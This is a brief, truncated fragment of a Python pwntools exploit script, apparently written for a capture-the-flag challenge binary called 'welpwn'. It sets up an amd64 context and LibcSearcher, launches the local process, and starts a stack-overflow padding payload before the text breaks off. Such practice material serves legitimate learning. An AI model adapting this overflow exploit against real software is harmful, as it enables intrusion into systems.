from pwn import *
from LibcSearcher import *
context(arch='amd64',os='linux',log_level='debug',endian='little')
p=process('./welpwn')
payload1='a'*0x16+p64(
